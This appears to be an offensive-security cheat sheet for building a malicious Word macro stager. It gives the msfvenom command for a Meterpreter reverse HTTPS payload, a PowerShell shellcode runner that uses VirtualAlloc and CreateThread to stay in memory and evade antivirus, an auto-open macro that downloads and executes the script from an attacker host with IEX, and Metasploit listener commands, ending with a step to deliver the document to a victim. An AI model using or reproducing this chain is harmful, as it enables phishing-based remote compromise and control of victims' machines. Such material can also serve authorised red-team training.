# Unencrypted PowerShell Stager

Keep in mind that these makes some Win32 API calls to avoid loading in disk and avoid AV detection. We need to things:

1. The Macros stager that will download the payload, this one does not touches the disk, only memory.
2. The malicious powershell payload that will trigger our reverse shell.

### 1) Create shellcode

    # If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f ps1

### 2) Create PowerShell script

Insert here your shellcode and save the file as run.ps1

    $Kernel32 = @"
    using System;
    using System.Runtime.InteropServices;
    
    public class Kernel32 {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);
            
        [DllImport("kernel32", CharSet=CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                uint dwCreationFlags, IntPtr lpThreadId);
                
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
    }
    "@
    
    Add-Type $Kernel32
    
    # INSERT SHELLCODE HERE
    [Byte[]] $buf = 0xfc,0x48,0x83,..,0x41,0x89,0xda,0xff
    
    $size = $buf.Length
    
    [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
    
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
    
    $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
    [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

### 3) Create Macro

Save the file as a .docm

    Sub MyMacro()
        Dim str As String
        str = "powershell (New-Object System.Net.WebClient).DownloadString('http://[ATTACKER_IP]/[stager_filename].ps1') | IEX"
        Shell str, vbHide
    End Sub
    
    Sub Document_Open()
        MyMacro
    End Sub
    
    Sub AutoOpen()
        MyMacro
    End Sub

### 4) Start HTTP Server

    python3 -m http.server 80

### 5) Start Metasploit listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

### 6) Deliver Macro to victim
